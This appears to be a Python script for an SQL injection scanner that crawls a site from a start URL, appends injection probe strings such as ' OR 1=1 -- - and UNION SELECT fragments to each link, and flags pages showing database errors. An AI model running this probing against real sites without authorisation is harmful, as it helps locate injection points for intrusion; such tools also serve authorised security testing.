import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import os
import signal
import argparse
from pystyle import Colors, Colorate
import time
import random

R = '\033[31m'
G = '\033[32m'
W = '\033[0m'

def extract_links_from_page(url):
    try:
        response = requests.get(url)
        response_text = response.text
        soup = BeautifulSoup(response_text, "html.parser")
        links = [urljoin(url, link.get("href")) for link in soup.find_all("a")]
        return links
    except requests.RequestException as e:
        print(R + "[!]Error ->", e)
        return []

def check_sql_injection(url):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.content, "html.parser")
        page_text = soup.get_text()
        
        if "SQL syntax" in page_text or "MySQL Query Error" in page_text or "Fatal error" in page_text or "Uncaught Error" in page_text:
            return True
        else:
            return False
    except requests.RequestException as e:
        print(R + "[!]Error ->", e)
        return False

def handle_interrupt(signum, frame,sql_injection_urls):
    print(Colorate.Vertical(Colors.green_to_blue, "**************************************************************************"))
    if sql_injection_urls:
        print(G + "\n[+]" + W + "Links with potential SQL injections:" + W)
        for url in sql_injection_urls:
            print(W + url)
            
    if not sql_injection_urls:
        print(print(R + "\n[-]" + W + "Potential SQL injection not found:" + W))
    exit()

def main():
    parser = argparse.ArgumentParser(description="SQL Error")
    parser.add_argument("base_url", nargs="?", type=str, help="Enter the start URL")
    args = parser.parse_args()

    if args.base_url:
        base_url = args.base_url
    else:
        base_url = input(G + "Enter the start URL: " + W)

    visited_urls = set()
    queue = [base_url]
    sql_injection_urls = []  
    sql_patterns = ["'", "''", "`", "``", ",", "\"", "\"\"", "/", "//", "\\", "\\\\",
                    ";", "' or \"", "-- or #", "' OR '1", "' OR 1 -- -",
                    "\" OR \"\" = \"", "\" OR 1 = 1 -- -", "' OR '' = '",
                    "'='", "'LIKE'", "'=0--+", " OR 1=1", "' OR 'x'='x",
                    "' AND id IS NULL; --", "'''''''''''''UNION SELECT '2",
                    "%00", "/*…*/"]

    signal.signal(signal.SIGINT, lambda signum, frame: handle_interrupt(signum, frame, sql_injection_urls))

    while queue:
        current_url = queue.pop(0)
        if current_url in visited_urls:
            continue

        print(Colorate.Vertical(Colors.green_to_blue, "**************************************************************************"))
        print(G + "Scanning:" + W, current_url)
        visited_urls.add(current_url)

        if check_sql_injection(current_url):
            print(G + "[+]" + W + "Potential SQL injection found ->" + G, current_url)
            sql_injection_urls.append(current_url)

        links = extract_links_from_page(current_url)
        for link in links:
            if link not in visited_urls:
                queue.append(link)
                for pattern in sql_patterns:
                    modified_url = link + pattern
                    if check_sql_injection(modified_url):
                        print(G + "[+]" + W + "Potential SQL injection found ->" + G, modified_url)
                        sql_injection_urls.append(modified_url)  

    signal.signal(signal.SIGINT, signal.SIG_DFL) 
    
    
if __name__ == "__main__":
    os.system('cls' if os.name == 'nt' else 'clear')
    a = [""" 
        ░██████╗░██████╗░██╗░░░░░  ███████╗██████╗░██████╗░░█████╗░██████╗░
        ██╔════╝██╔═══██╗██║░░░░░  ██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗
        ╚█████╗░██║██╗██║██║░░░░░  █████╗░░██████╔╝██████╔╝██║░░██║██████╔╝
        ░╚═══██╗╚██████╔╝██║░░░░░  ██╔══╝░░██╔══██╗██╔══██╗██║░░██║██╔══██╗
        ██████╔╝░╚═██╔═╝░███████╗  ███████╗██║░░██║██║░░██║╚█████╔╝██║░░██║
        ╚═════╝░░░░╚═╝░░░╚══════╝  ╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝     
        """,
        """             
        ░██████╗███╗░░░███╗░█████╗░██╗░░██╗███████╗
        ██╔════╝████╗░████║██╔══██╗██║░██╔╝██╔════╝
        ╚█████╗░██╔████╔██║███████║█████═╝░█████╗░░
        ░╚═══██╗██║╚██╔╝██║██╔══██║██╔═██╗░██╔══╝░░
        ██████╔╝██║░╚═╝░██║██║░░██║██║░╚██╗███████╗
        ╚═════╝░╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝  
        """]
    title =random.choice(a)
    print(Colorate.Vertical(Colors.red_to_black,title))

    main()
